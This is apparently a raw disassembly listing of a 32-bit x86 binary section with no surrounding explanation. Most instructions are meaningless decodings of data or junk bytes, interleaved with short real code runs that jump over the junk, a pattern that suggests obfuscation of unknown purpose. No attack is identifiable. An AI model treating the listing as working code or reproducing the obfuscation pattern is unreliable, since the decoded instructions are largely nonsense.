  40194d:	mov    dl,0x5b
  40194f:	leave  
  401950:	sub    al,0xf9
  401952:	fnstenvw [eax*4-0x609aa32f]
  40195a:	push   edi
  40195b:	pop    es
  40195c:	cmp    ecx,edi
  40195e:	mov    bl,0xae
  401960:	dec    esp
  401961:	add    bh,BYTE PTR [ecx]
  401963:	xor    DWORD PTR [ebx-0x242a9c95],0xfffffffe
  40196a:	xchg   ecx,eax
  40196b:	or     ecx,edx
  40196d:	pop    edx
  40196e:	inc    ecx
  40196f:	push   ebp
  401970:	push   edx
  401971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401972:	les    esp,FWORD PTR [ecx+0x63]
  401975:	stos   DWORD PTR es:[edi],eax
  401976:	push   edx
  401977:	pop    ds
  401978:	test   DWORD PTR [ecx],ebp
  40197a:	mov    bl,0xf3
  40197c:	cld    
  40197d:	call   0x788d:0x5dc11dfa
  401984:	xchg   ecx,eax
  401985:	xchg   BYTE PTR ds:0x67b7e58e,cl
  40198b:	stc    
  40198c:	push   edi
  40198d:	jg     0x401935
  40198f:	pop    ds
  401990:	aam    0xdb
  401992:	jl     0x307c14c
  401998:	push   cs
  401999:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40199a:	outs   dx,DWORD PTR ds:[esi]
  40199b:	xchg   edi,eax
  40199c:	out    0x95,eax
  40199e:	push   0x1c90660b
  4019a3:	paddq  mm1,QWORD PTR [ecx+ebx*4-0x61f88c45]
  4019ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019ac:	xor    esp,0x7ebd781d
  4019b2:	push   edx
  4019b3:	mov    cl,0x8e
  4019b5:	js     0x401a05
  4019b7:	fs pop eax
  4019b9:	in     al,dx
  4019ba:	(bad)  
  4019bb:	jg     0x40196e
  4019bd:	fisttp WORD PTR ds:0xc62846a4
  4019c3:	or     eax,0x43fac51c
  4019c8:	test   al,0x51
  4019ca:	push   edi
  4019cb:	scas   ax,WORD PTR es:[edi]
  4019cd:	sbb    eax,0x754c7a38
  4019d2:	pop    edx
  4019d3:	pop    edx
  4019d4:	mov    ds:0xed8bf1fc,eax
  4019d9:	addr16 cmp al,0x39
  4019dc:	fdiv   st,st(4)
  4019de:	lds    ebp,FWORD PTR [esi-0xe2ee69a]
  4019e4:	js     0x401a40
  4019e6:	pusha  
  4019e7:	inc    eax
  4019e9:	ret    0xfce3
  4019ec:	(bad)
  4019f0:	jmp    0xa3e08b1b
  4019f5:	sub    ch,bl
  4019f7:	push   es
  4019f8:	je     0x4019d6
  4019fa:	xor    ah,BYTE PTR [ecx]
  4019fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019fd:	into   
  4019fe:	cmp    bh,cl
  401a00:	aaa    
  401a01:	mov    dh,0xdd
  401a03:	add    dl,dh
  401a05:	aam    0xa0
  401a07:	jae    0x401a66
  401a09:	xchg   edx,eax
  401a0a:	rcr    BYTE PTR [edi],1
  401a0c:	iret   
  401a0d:	and    DWORD PTR [ecx+0xb],ecx
  401a10:	dec    esp
  401a11:	imul   ecx,DWORD PTR [ebx],0xfffffff7
  401a14:	fwait
  401a15:	test   eax,0x3505629b
  401a1a:	daa    
  401a1b:	mov    esi,0x490ba344
  401a20:	icebp  
  401a21:	sti    
  401a22:	mov    ds:0xf59a4e52,eax
  401a27:	xchg   edx,eax
  401a28:	aas    
  401a29:	sbb    DWORD PTR ds:0xa002bfd2,edi
  401a2f:	xor    dl,ch
  401a31:	jns    0x401a50
  401a33:	mov    bl,0x2a
  401a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a36:	mov    ds:0xc30e42dd,al
  401a3b:	sbb    DWORD PTR [ebp-0x75],ebp
  401a3e:	pusha  
  401a3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a40:	ficomp WORD PTR [ebx]
  401a42:	addr16 js 0x401ab9
  401a45:	call   0x2c74:0xf61dd868
  401a4c:	cli    
  401a4d:	repz xchg esi,eax
  401a4f:	or     eax,DWORD PTR [ebx-0x4f]
  401a52:	icebp  
  401a53:	mov    dl,0xbb
  401a55:	mov    ch,0x7f
  401a57:	push   eax
  401a58:	jnp    0x401a3e
  401a5a:	jne    0x401a71
  401a5c:	mov    cl,0x22
  401a5e:	pop    ds
  401a5f:	xor    ebp,DWORD PTR [edx]
  401a61:	sbb    al,0x58
  401a63:	test   al,0x93
  401a65:	out    dx,eax
  401a66:	cmp    cl,al
  401a68:	mov    esp,0x5e2246d6
  401a6d:	fldenv [eax]
  401a6f:	add    eax,edi
  401a71:	inc    edx
  401a72:	out    dx,eax
  401a73:	nop
  401a74:	jle    0x401a71
  401a76:	push   eax
  401a77:	mov    DWORD PTR [ebp-0x50],ebx
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	push   ebp
  401a8c:	dec    esi
  401a8d:	ficom  WORD PTR [esi+0x7e7e780e]
  401a93:	cli    
  401a94:	jg     0x401b14
  401a96:	jle    0x401aa2
  401a98:	add    eax,0xd914a5bc
  401a9d:	pusha  
  401a9e:	dec    edi
  401a9f:	pop    ds
  401aa0:	and    DWORD PTR ds:0xb7bb3733,0xffffffe7
  401aa7:	xor    dl,BYTE PTR [ebp-0x4f41e28a]
  401aad:	gs fdiv st,st(5)
  401ab0:	sub    DWORD PTR [edi+0x4aca934d],eax
  401ab6:	add    cl,BYTE PTR [eax+ebx*8+0x75]
  401aba:	iret   
  401abb:	dec    ecx
  401abc:	xchg   edi,eax
  401abd:	clc    
  401abe:	adc    al,0x2b
  401ac0:	retf   
  401ac1:	xchg   edi,eax
  401ac2:	and    dh,BYTE PTR cs:[ebx-0x59f44328]
  401ac9:	mov    ebx,0xfb609c08
  401ace:	cwde   
  401acf:	jbe    0x401a8b
  401ad1:	xor    al,0x42
  401ad3:	jmp    0xc755b495
  401ad8:	dec    ecx
  401ad9:	jecxz  0x401a60
  401adb:	sti    
  401adc:	sbb    al,0xd3
  401ade:	stos   BYTE PTR es:[edi],al
  401adf:	xchg   edi,eax
  401ae0:	cwde   
  401ae1:	(bad)  
  401ae2:	xor    bh,dl
  401ae4:	push   ss
  401ae5:	add    DWORD PTR [ebx+0x74],esp
  401ae8:	add    al,0xb3
  401aea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401aeb:	jmp    0xfbd5b113
  401af0:	scas   al,BYTE PTR es:[edi]
  401af1:	stos   BYTE PTR es:[edi],al
  401af2:	sbb    BYTE PTR [ebp+0x1f3d305b],0x17
  401af9:	push   cs
  401afa:	or     DWORD PTR [eax],edi
  401afc:	int3   
  401afd:	xchg   esi,eax
  401afe:	nop
  401aff:	jge    0x401b2b
  401b01:	pop    esp
  401b02:	push   0x7c
  401b04:	mov    bh,0xa5
  401b06:	push   esi
  401b07:	cwde   
  401b08:	clc    
  401b09:	mov    ds:0x4ad4a18a,eax
  401b0e:	add    ch,dl
  401b10:	in     eax,0x9d
  401b12:	add    BYTE PTR [ebx+0x24],dh
  401b15:	out    dx,al
  401b16:	loope  0x401b74
  401b18:	ins    BYTE PTR es:[edi],dx
  401b19:	mul    BYTE PTR [ebx-0x4f]
  401b1c:	test   BYTE PTR [edi],dl
  401b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b1f:	loopne 0x401ab2
  401b21:	test   DWORD PTR [edx+edi*2+0x618c7570],ebx
  401b28:	sub    BYTE PTR [ecx],ch
  401b2a:	sub    dl,BYTE PTR [ebx-0x2bc2be48]
  401b30:	iret   
  401b31:	adc    DWORD PTR [edi],esi
  401b33:	psubusw mm6,QWORD PTR [ecx+0x180b4dcf]
  401b3a:	call   0x8427:0xb0a0583c
  401b41:	adc    DWORD PTR [ebx+eiz*8],ebp
  401b44:	sub    DWORD PTR [ecx],ecx
  401b46:	ret    0x38b2
  401b49:	mov    al,0xf2
  401b4b:	inc    edi
  401b4c:	mov    WORD PTR [ecx-0x49d92b84],cs
  401b52:	mov    dl,0xb7
  401b54:	add    DWORD PTR [eax-0x4db1a1ff],edi
  401b5a:	fs push es
  401b5c:	test   ch,0x80
  401b5f:	cli    
  401b60:	push   esi
  401b61:	int    0x45
  401b63:	dec    ebp
  401b64:	add    DWORD PTR [ecx],esi
  401b66:	push   ebx
  401b67:	imul   ecx,DWORD PTR [eax-0x64a14f58],0xcba158de
  401b71:	inc    ebp
  401b72:	add    dh,BYTE PTR [ebx-0x44]
  401b75:	push   ecx
  401b76:	xchg   esi,eax
  401b77:	sub    eax,DWORD PTR [ecx+ebp*1+0xcbe058b]
  401b7e:	frstor [esp+edx*4+0x26]
  401b82:	jl     0x401bb4
  401b84:	add    al,0x34
  401b86:	jecxz  0x401b1a
  401b88:	xlat   BYTE PTR ds:[ebx]
  401b89:	xor    BYTE PTR [esi+0x27809d6d],bl
  401b8f:	gs jne 0x401bdd
  401b92:	cmp    al,0x90
  401b94:	fucomi st,st(0)
  401b96:	int3   
  401b97:	not    dl
  401b99:	fmul   st(6),st
  401b9b:	pop    ss
  401b9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b9d:	aaa    
  401b9e:	jg     0x401bdb
  401ba0:	je     0x401b8b
  401ba2:	xor    al,0x6
  401ba4:	adc    BYTE PTR [ecx-0x2b],dl
  401ba7:	inc    esp
  401ba8:	push   eax
  401ba9:	xor    al,0xf3
  401bab:	fld    DWORD PTR ss:[edx+0x966d699]
  401bb2:	sub    ecx,DWORD PTR [edx+0x5709a435]
  401bb8:	sub    al,0x44
  401bba:	rcl    cl,0xbe
  401bbd:	mov    ebx,0x22a64b1a
  401bc2:	test   eax,0x8d1611b3
  401bc7:	cmp    al,BYTE PTR [edx+0x11]
  401bca:	xchg   edx,eax
  401bcb:	add    bh,ch
  401bcd:	adc    BYTE PTR [eax],al
  401bcf:	and    BYTE PTR [ecx-0x2f],ah
  401bd2:	and    edx,DWORD PTR [esi-0x68]
  401bd5:	js     0x401bff
  401bd7:	dec    esp
  401bd8:	jnp    0x401bb7
  401bda:	xor    eax,0xf7d49b05
  401bdf:	fidiv  DWORD PTR [edx+0x51e4b512]
  401be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401be6:	sahf   
  401be7:	out    dx,eax
  401be8:	jp     0x401c32
  401bea:	mov    DWORD PTR [ebx+0x64],ecx
  401bed:	popa   
  401bee:	dec    ebp
  401bef:	popf   
  401bf0:	push   ecx
  401bf1:	sahf   
  401bf2:	iret   
  401bf3:	pop    es
  401bf4:	or     BYTE PTR [ebx-0x53],bh
  401bf7:	in     eax,0x6e
  401bf9:	cli    
  401bfa:	jmp    0x15982abf
  401bff:	mov    ebx,0xfcd6efb1
  401c04:	(bad)  
  401c05:	out    0xf6,eax
  401c07:	jmp    esp
  401c09:	retf   
  401c0a:	lods   eax,DWORD PTR ds:[esi]
  401c0b:	mov    ah,0x32
  401c0d:	pop    ss
  401c0e:	jns    0x401bfa
  401c10:	std    
  401c11:	sub    BYTE PTR [edi],bh
  401c13:	and    dh,ah
  401c15:	clc    
  401c16:	inc    eax
  401c17:	push   eax
  401c18:	jne    0x401c1b
  401c1a:	xchg   ebp,eax
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	adc    ebx,edx
  401c42:	adc    DWORD PTR [eax],0xffffff8a
  401c45:	jns    0x401cc5
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c17
  401c4d:	push   ecx
  401c4e:	imul   edi,DWORD PTR [ecx],0x64fe499e
  401c54:	adc    BYTE PTR [eax-0x64],dl
  401c57:	jbe    0x69dda914
  401c5d:	mov    edx,0xa7d4037e
  401c62:	aam    0xea
  401c64:	aaa    
  401c65:	jo     0x401bf2
  401c67:	xchg   ecx,eax
  401c68:	dec    eax
  401c69:	aaa    
  401c6a:	sub    bh,BYTE PTR [esi]
  401c6c:	push   edi
  401c6d:	pop    esi
  401c6e:	sub    BYTE PTR [ebx+eax*2],cl
  401c71:	fistp  QWORD PTR [edx+0x6022fe17]
  401c77:	sub    ebx,DWORD PTR [edx]
  401c79:	pushf  
  401c7a:	mov    BYTE PTR [ebx+0x45],0x53
  401c7e:	pop    esp
  401c7f:	loop   0x401ccb
  401c81:	pusha  
  401c82:	repz xchg ebx,eax
  401c84:	outs   dx,BYTE PTR ds:[esi]
  401c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c86:	jno    0x401cb4
  401c88:	pop    ebp
  401c89:	xor    dl,BYTE PTR [edi]
  401c8b:	and    esi,DWORD PTR ds:[edx+eiz*4+0x2b]
  401c90:	and    BYTE PTR [ecx],0xd1
  401c93:	mov    ch,0x6a
  401c95:	mov    eax,0xf138697f
  401c9a:	inc    ebp
  401c9b:	push   ebx
  401c9c:	sar    BYTE PTR [edi],1
  401c9e:	pop    ebp
  401c9f:	jbe    0x401cfb
  401ca1:	ret    0x637f
  401ca4:	mov    al,ds:0x55fead19
  401ca9:	dec    ecx
  401caa:	scas   al,BYTE PTR es:[edi]
  401cab:	loop   0x401c45
  401cad:	xchg   esi,eax
  401cae:	push   ebx
  401caf:	inc    ebx
  401cb0:	out    0xe9,eax
  401cb2:	cmp    esp,DWORD PTR [esi]
  401cb4:	(bad)  
  401cb5:	fisub  DWORD PTR [ebx]
  401cb7:	out    dx,al
  401cb8:	(bad)  
  401cb9:	rcr    ebp,0x16
  401cbc:	pop    ds
  401cbd:	xor    DWORD PTR [edx+0x207288d3],esp
  401cc3:	fwait
  401cc4:	repnz mov eax,ds:0x88f6dd0
  401cca:	dec    ebx
  401ccb:	es push 0xfcdcdd40
  401cd1:	cmp    BYTE PTR [ecx],ah
  401cd3:	pop    edi
  401cd4:	popf   
  401cd5:	call   0x504e:0x55f046bb
  401cdc:	aad    0x23
  401cde:	aaa    
  401cdf:	cmp    cl,BYTE PTR [edi+0x7af425f]
  401ce5:	ret    0x535d
  401ce8:	sbb    edi,DWORD PTR [edx]
  401cea:	and    esi,edx
  401cec:	mov    ebx,0xa4e96289
  401cf1:	dec    eax
  401cf2:	lahf   
  401cf3:	push   0xdcc4f8cf
  401cf8:	sub    edx,ebp
  401cfa:	pop    ds
  401cfb:	dec    esi
  401cfc:	je     0x401c81
  401cfe:	mov    esp,0xca9f5e74
  401d03:	mov    WORD PTR [esi+0x68e4ad03],ss
  401d09:	aas    
  401d0a:	shl    ecx,1
  401d0c:	mov    DWORD PTR [ebx+0x3ccc3e4c],ebx
  401d12:	aas    
  401d13:	add    ecx,eax
  401d15:	out    0xb8,eax
  401d17:	push   edx
  401d18:	mov    bl,0xd
  401d1a:	hlt    
  401d1b:	sbb    BYTE PTR [eax-0xb],al
  401d1e:	pop    esp
  401d1f:	fldcw  WORD PTR [ebp+0x3bd5ecca]
  401d25:	mov    eax,0xb4ad3fd6
  401d2a:	jnp    0x401d0c
  401d2c:	into   
  401d2d:	test   eax,0xad1912dc
  401d32:	mov    ds:0x678c020c,eax
  401d37:	mov    ch,0x61
  401d39:	jno    0x401cc6
  401d3b:	lods   eax,DWORD PTR ds:[esi]
  401d3c:	rcr    DWORD PTR [esi],cl
  401d3e:	inc    ecx
  401d3f:	cdq    
  401d40:	not    eax
  401d42:	jo     0x401db0
  401d44:	icebp  
  401d45:	std    
  401d46:	or     al,0x56
  401d48:	or     DWORD PTR [ebp+0x25],esp
  401d4b:	or     eax,0xfdc21c46
  401d50:	rol    DWORD PTR [ecx],0xd8
  401d53:	sbb    DWORD PTR [edi-0x42],0xf316dfc3
  401d5a:	adc    al,0x5d
  401d5c:	dec    edi
  401d5d:	ret    
  401d5e:	ins    DWORD PTR es:[edi],dx
  401d5f:	mov    ah,BYTE PTR [esi+0x66]
  401d62:	(bad)  
  401d63:	scas   eax,DWORD PTR es:[edi]
  401d64:	pop    ebp
  401d65:	and    eax,0x4b02ce4e
  401d6a:	xchg   edi,eax
  401d6b:	enter  0x6ca8,0x4d
  401d6f:	sbb    eax,0xa2063fbc
  401d74:	sub    edi,0x8ddc066b
  401d7a:	popa   
  401d7b:	popf   
  401d7c:	push   0xef6d1e78
  401d81:	xchg   edx,eax
  401d82:	inc    ebp
  401d83:	cwde   
  401d84:	std    
  401d85:	ret    
  401d86:	push   es
  401d87:	add    DWORD PTR [edi-0x3e],ecx
  401d8a:	dec    ebp
  401d8b:	push   ebp
  401d8c:	add    eax,edi
  401d8e:	inc    esi
  401d8f:	loop   0x401d3f
  401d91:	and    DWORD PTR [ecx],edx
  401d93:	loopne 0x401d36
  401d95:	xchg   ebx,eax
  401d96:	stos   BYTE PTR es:[edi],al
  401d97:	jo     0x401e04
  401d99:	scas   al,BYTE PTR es:[edi]
  401d9a:	xchg   ebp,eax
  401d9b:	ficom  DWORD PTR [edi*4-0x35d27d0c]
  401da2:	and    BYTE PTR [esi],cl
  401da4:	stos   BYTE PTR es:[edi],al
  401da5:	adc    edi,DWORD PTR [ebp+0x1dbf9f36]
  401dab:	outs   dx,DWORD PTR ds:[esi]
  401dac:	dec    ebp
  401dad:	and    DWORD PTR [ebx],0x94ff5e26
  401db3:	dec    esp
  401db4:	inc    edx
  401db5:	mov    ecx,0x37d21dba
  401dba:	(bad)  
  401dbb:	hlt    
  401dbc:	xchg   esp,eax
  401dbd:	mov    al,0x70
  401dbf:	cmc    
  401dc0:	iret   
  401dc1:	mov    ecx,0xf5afd0a0
  401dc6:	ret    
  401dc7:	fistp  QWORD PTR [eax+eax*1-0x70]
  401dcb:	ss mov ebx,0x369c1a1
  401dd1:	(bad)  
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax+0x7647c638],ebp
  401e0d:	call   0x7ffa:0x7e7e0716
  401e14:	jle    0x401e94
  401e16:	sub    BYTE PTR ds:0xa09f6770,al
  401e1c:	aaa    
  401e1d:	push   ebx
  401e1e:	loopne 0x401dc8
  401e20:	pop    eax
  401e21:	adc    eax,0xc76aa29e
  401e26:	push   ebx
  401e27:	sub    eax,0x39e4e8c8
  401e2c:	aam    0x17
  401e2e:	xor    ecx,DWORD PTR [edx+edx*4]
  401e31:	jp     0x401e0c
  401e33:	mov    esp,0x4f18bf14
  401e38:	call   FWORD PTR [esi]
  401e3a:	rcl    BYTE PTR [ebp+0x9600a56],1
  401e40:	das    
  401e41:	inc    edi
  401e42:	pushf  
  401e43:	daa    
  401e44:	mov    bh,0x65
  401e46:	fs dec esp
  401e48:	retf   
  401e49:	push   edi
  401e4a:	add    al,0x4a
  401e4c:	or     eax,0x4a7f6de0
  401e51:	push   ebp
  401e52:	bound  edx,QWORD PTR [ecx+0x5e]
  401e55:	enter  0x68cb,0x4a
  401e59:	xor    ah,BYTE PTR [ecx]
  401e5b:	in     al,0x52
  401e5d:	(bad)  
  401e5e:	repz js 0x401e7a
  401e61:	xor    ah,ah
  401e63:	cmp    BYTE PTR [ecx+esi*8],0xce
  401e67:	enter  0x5ccc,0x4b
  401e6b:	iret   
  401e6c:	xchg   cl,dl
  401e6e:	jno    0x401ed2
  401e70:	cmp    bh,0x20
  401e73:	pop    esp
  401e74:	prefetcht1 BYTE PTR [ecx+0x19]
  401e78:	(bad)  
  401e79:	and    al,0x1b
  401e7b:	dec    ebp
  401e7c:	mov    dh,0xe4
  401e7e:	fsubr  DWORD PTR [ecx-0x49d4aaa8]
  401e84:	add    al,0xff
  401e86:	retf   
  401e87:	cld    
  401e88:	(bad)  
  401e89:	fst    QWORD PTR [ebp+0x42]
  401e8c:	inc    eax
  401e8d:	daa    
  401e8e:	repz rol BYTE PTR [ecx-0x4d],cl
  401e92:	iret   
  401e93:	dec    ecx
  401e94:	sbb    eax,eax
  401e96:	inc    esi
  401e97:	mov    ch,0xa
  401e99:	js     0x401e57
  401e9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e9c:	mov    ebp,DWORD PTR [ebx]
  401e9e:	ds call 0x6420:0x56684a1d
  401ea6:	mov    dl,0x2c
  401ea8:	jns    0x401ea4
  401eaa:	push   ebp
  401eab:	jo     0x401ec7
  401ead:	mov    al,ds:0x1df5bdf0
  401eb2:	xlat   BYTE PTR ds:[ebx]
  401eb3:	add    DWORD PTR [edi-0x4fa351fa],0x9bf6949d
  401ebd:	in     eax,0x59
  401ebf:	add    al,0xce
  401ec1:	adc    bl,ch
  401ec3:	dec    eax
  401ec4:	xor    al,BYTE PTR [edi+0x6a5cade1]
  401eca:	mov    ebx,0xbdd17e84
  401ecf:	jo     0x401e6f
  401ed1:	xor    edx,DWORD PTR [edi+0x39d35f99]
  401ed7:	retf   0x1b06
  401eda:	mov    ebp,0x7c01ba35
  401edf:	into   
  401ee0:	into   
  401ee1:	mov    eax,0x2bbff102
  401ee6:	jns    0x401e76
  401ee8:	mov    eax,0x4a5fd23e
  401eed:	out    dx,eax
  401eee:	cdq    
  401eef:	in     al,0x44
  401ef1:	fwait
  401ef2:	jle    0x401ee4
  401ef4:	mov    ch,0x77
  401ef6:	cwde   
  401ef7:	pop    esp
  401ef8:	and    dh,BYTE PTR [eax]
  401efa:	fistp  WORD PTR [eax+0x28]
  401efd:	push   edi
  401efe:	fdivr  st(2),st
  401f00:	fdiv   DWORD PTR [ebp+0x45]
  401f03:	jl     0x401f1a
  401f05:	mov    bl,0x17
  401f07:	fistp  QWORD PTR [edx-0x4ffd7ceb]
  401f0d:	dec    edi
  401f0e:	call   0x7291:0x39632688
  401f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f16:	jp     0x401f3f
  401f18:	pop    esi
  401f19:	pop    esp
  401f1a:	pop    esp
  401f1b:	xchg   BYTE PTR ds:[edx],dh
  401f1e:	test   BYTE PTR [ecx+0x25],al
  401f21:	jae    0x401f27
  401f23:	push   ebx
  401f24:	mov    BYTE PTR [esi+0x54],0xb4
  401f28:	push   ds
  401f29:	cld    
  401f2a:	ret    0x4576
  401f2d:	push   esp
  401f2e:	scas   eax,DWORD PTR es:[edi]
  401f2f:	sub    BYTE PTR [edi],al
  401f31:	(bad)  
  401f32:	out    dx,al
  401f33:	lds    esp,FWORD PTR [edx+ebx*2-0x61]
  401f37:	mov    bl,0xcc
  401f39:	int    0xea
  401f3b:	jecxz  0x401fac
  401f3d:	or     DWORD PTR [esi],0xf3b9e0f
  401f43:	test   al,0xb9
  401f45:	mov    al,0x5e
  401f47:	and    eax,0x9fda8a7e
  401f4c:	retf   0x7f81
  401f4f:	outs   dx,DWORD PTR ds:[esi]
  401f50:	ins    WORD PTR es:[edi],dx
  401f52:	imul   eax,DWORD PTR [esi+0x5f],0x32c3e8fd
  401f59:	frstor [edi-0x9]
  401f5c:	cmp    dl,bh
  401f5e:	ret    0xd5d6
  401f61:	dec    ebx
  401f62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f63:	dec    edx
  401f64:	jg     0x401f91
  401f66:	icebp  
  401f67:	cmp    eax,0xa489b877
  401f6c:	sub    edi,0xffffffb7
  401f6f:	mov    esi,0x36ae0afc
  401f74:	imul   ebp,DWORD PTR [ebx],0xd21f62d8
  401f7a:	enter  0x58df,0x34
  401f7e:	ret    
  401f7f:	cwde   
  401f80:	jmp    0x139dd3a
  401f85:	lds    ebx,FWORD PTR [ebx-0x3af71d6c]
  401f8b:	push   esi
  401f8c:	stos   BYTE PTR es:[edi],al
  401f8d:	out    dx,al
  401f8e:	mov    edx,DWORD PTR [edx]
  401f90:	mov    edx,0x371f7cbd
  401f95:	xchg   esp,eax
  401f96:	repnz out 0x6d,eax
  401f99:	sbb    al,0xf
  401f9b:	test   BYTE PTR [ebp+0x3],ch
  401f9e:	add    BYTE PTR [eax],al
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xa01749a1
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f80
  401fcc:	int    0x17
  401fce:	(bad)  
  401fcf:	fadd   DWORD PTR [ecx+0x2d62851f]
  401fd5:	dec    eax
  401fd6:	or     eax,0x53905fa4
  401fdb:	sbb    dh,BYTE PTR [eax-0x69]
  401fde:	inc    ebx
  401fdf:	(bad)  [ebp-0x5eef8055]
  401fe5:	or     BYTE PTR [eax+0x3718afb9],ah
  401feb:	pop    esp
  401fec:	mov    eax,?
  401fee:	cli    
  401fef:	xchg   edx,eax
  401ff0:	test   al,0xf9
  401ff2:	nop
  401ff3:	lock xchg edx,eax
  401ff5:	popf   
  401ff6:	sahf   
  401ff7:	inc    ecx
  401ff8:	(bad)  
  401ff9:	cdq    
  401ffa:	in     al,dx
  401ffb:	nop
  401ffc:	xor    DWORD PTR [esi],edi
  401ffe:	das    
  401fff:	clc    
  402000:	in     al,dx
  402001:	fld    QWORD PTR [eax+edx*1]
  402004:	pop    edx
  402005:	fcom   DWORD PTR [edi+edx*1]
  402008:	stos   BYTE PTR es:[edi],al
  402009:	in     al,dx
  40200a:	cmp    dh,cl
  40200c:	xchg   ecx,eax
  40200d:	rcr    bh,1
  40200f:	sahf   
  402010:	ss sub edx,ecx
  402013:	sub    ebx,DWORD PTR [esi]
  402015:	sbb    bl,0x73
  402018:	cmp    al,0x2f
  40201a:	adc    BYTE PTR [ebx],dh
  40201c:	pop    ebp
  40201d:	popf   
  40201e:	dec    ebp
  40201f:	popa   
  402020:	shr    DWORD PTR [eax+0x31],cl
  402023:	xchg   edi,eax
  402024:	hlt    
  402025:	adc    BYTE PTR [ebp-0x4],0x12
  402029:	enter  0x6cc5,0xc9
  40202d:	add    al,0x43
  40202f:	mov    ch,0xa5
  402031:	xor    eax,0x26ce7f6f
  402036:	jp     0x401fb9
  402038:	add    BYTE PTR [edi-0x3e3963c1],0xf5
  40203f:	inc    ebp
  402040:	xchg   ebx,eax
  402041:	sbb    al,0x27
  402043:	inc    ebp
  402044:	daa    
  402045:	pushf  
  402046:	dec    esi
  402047:	add    esp,esp
  402049:	pop    es
  40204a:	and    eax,0xd0f418f0
  40204f:	or     cl,BYTE PTR [eax+0x282dc6ed]
  402055:	add    al,0x3f
  402057:	(bad)  
  402058:	not    BYTE PTR [edi-0x4b]
  40205b:	cmc    
  40205c:	adc    ebp,DWORD PTR [ecx+eax*2]
  40205f:	hlt    
  402060:	out    0xae,al
  402062:	jg     0x402029
  402064:	ret    
  402065:	pop    es
  402066:	std    
  402067:	jmp    0xd3a25b93
  40206c:	repz mov ?,esi
  40206f:	xor    DWORD PTR [ebx-0x26],esp
  402072:	(bad)  
  402073:	in     al,dx
  402074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402075:	aas    
  402076:	retf   0x7913
  402079:	(bad)  
  40207a:	cli    
  40207b:	aaa    
  40207c:	adc    dl,BYTE PTR [esi-0x1fea4184]
  402082:	and    BYTE PTR [esi-0x16],bl
  402085:	cwde   
  402086:	add    edx,DWORD PTR ds:0x100c6ac0
  40208c:	enter  0xbf72,0x5b
  402090:	out    dx,al
  402091:	dec    ebp
  402092:	sub    al,0xeb
  402094:	xor    cl,BYTE PTR [ecx]
  402096:	sbb    eax,0x9f7f2a11
  40209b:	xchg   ebp,eax
  40209c:	mov    ebp,0x4ba1c1a4
  4020a1:	mov    al,0x3a
  4020a3:	sbb    DWORD PTR [edx+esi*1],edi
  4020a6:	rol    DWORD PTR [edi],1
  4020a8:	xchg   esi,eax
  4020a9:	aam    0xa
  4020ab:	lods   al,BYTE PTR ds:[esi]
  4020ac:	mov    ch,0x6f
  4020ae:	jmp    0xa530:0xdb82a99b
  4020b5:	pop    esi
  4020b6:	movhps QWORD PTR [ebp+0x1c],xmm0
  4020ba:	stos   BYTE PTR es:[edi],al
  4020bb:	adc    cl,BYTE PTR [edx-0x564f9cd0]
  4020c1:	and    DWORD PTR [ebx+0x44],edi
  4020c4:	shr    esp,1
